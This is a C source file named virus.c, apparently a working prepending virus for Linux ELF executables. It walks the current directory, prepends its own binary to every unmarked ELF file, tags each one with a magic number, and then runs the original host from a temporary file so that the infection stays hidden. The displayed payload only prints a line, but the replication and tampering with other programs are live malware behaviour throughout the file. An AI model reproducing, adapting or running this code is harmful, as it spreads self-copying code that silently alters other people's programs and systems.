/*
 * virus.c
 *
 *
 * +-------+
 * | VIRUS |
 * +-------+
 * | HOST  |
 * +-------+
 * | MAGIC |
 * +-------+
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <elf.h>
#include <sys/sendfile.h>
#include <sys/wait.h>

#define VIRUS_SIZE 10462

#define VIRUS_DUPLICATE ".virus"
#define VIRUS_TMPHOST	".data.dat"
#define VIRUS_TMPEXEC	".exec"

#define VIRUS_MAGIC	7177135

void payload() {
	fputs("This is the virus payload.\n", stdout);
}

int infect(int vfd, const char *host) {
	int tfd, hfd, magic;
	ssize_t n;
	unsigned char e_ident[EI_NIDENT];
	uint16_t e_type;
	struct stat st;
	
	hfd = open(host, O_RDONLY);
	if (hfd == -1) 
		return 0;
	
	if (read(hfd, e_ident, EI_NIDENT) < EI_NIDENT)
		return 0;

	if (
		e_ident[EI_MAG0] != ELFMAG0 ||
		e_ident[EI_MAG1] != ELFMAG1 ||
		e_ident[EI_MAG2] != ELFMAG2 ||
		e_ident[EI_MAG3] != ELFMAG3 
	) 
		return 0;

	if (read(hfd, &e_type, sizeof(e_type)) < sizeof(e_type))
		return 0;

	if (e_type != ET_EXEC && e_type != ET_DYN) 
		return 0;

	lseek(hfd, sizeof(magic) * -1, SEEK_END);
	read(hfd, &magic, sizeof(magic));
	if (magic == VIRUS_MAGIC) 
		return 0;
	magic = VIRUS_MAGIC;

	lseek(vfd, 0, SEEK_SET);
	lseek(hfd, 0, SEEK_SET);
	fstat(hfd, &st);
	
	tfd = creat(VIRUS_TMPHOST, st.st_mode);
	if (tfd == -1) 
		return 0;

	sendfile(tfd, vfd, NULL, VIRUS_SIZE);
	sendfile(tfd, hfd, NULL, st.st_size);	
	write(tfd, &magic, sizeof(magic));

	close(tfd);
	close(hfd);

	rename(VIRUS_TMPHOST, host);
	return 1;
}

int main(int argc, char *const argv[], char *const envp[]) {
	DIR *dir;
	struct dirent *ent;
	struct stat st;
	int vfd, xfd, magic;
	pid_t pid;
	off_t offset;
	ino_t inode;

	vfd = open(argv[0], O_RDONLY);
	fstat(vfd, &st);
	inode = st.st_ino;

	dir = opendir(".");
	for (ent = readdir(dir); ent != NULL; ent = readdir(dir)) {

		if (ent->d_name[0] == '.') 
			continue;

		stat(ent->d_name, &st);
		if (!S_ISREG(st.st_mode)) 
			continue;

		if (st.st_ino == inode) 
			continue;

		infect(vfd, ent->d_name);
	}				
	closedir(dir);

	payload();

	fstat(vfd, &st);

	offset = lseek(vfd, 0, SEEK_END);

	if(offset==VIRUS_SIZE) {
		int _vfd_ = creat(VIRUS_DUPLICATE, st.st_mode);
		if(_vfd_ < 0)
			return -1;

		int magic = VIRUS_MAGIC;
		lseek(vfd, 0, SEEK_SET);
		sendfile(_vfd_, vfd, NULL, st.st_size);
		write(_vfd_, &magic, sizeof(magic));
		close(vfd);
		close(_vfd_);
		rename(VIRUS_DUPLICATE, argv[0]);
		return 0;
	}

	xfd = creat(VIRUS_TMPEXEC, st.st_mode);

	offset = lseek(vfd, VIRUS_SIZE, SEEK_SET);

	offset += sizeof(magic);
	sendfile(xfd, vfd, NULL, st.st_size - offset);
	close(xfd);
	close(vfd);

	pid = fork();
	if (pid == 0) {
		exit(execve(VIRUS_TMPEXEC, argv, envp));
	}

	waitpid(pid, NULL, 0);
	unlink(VIRUS_TMPEXEC);
	return 0;		
}
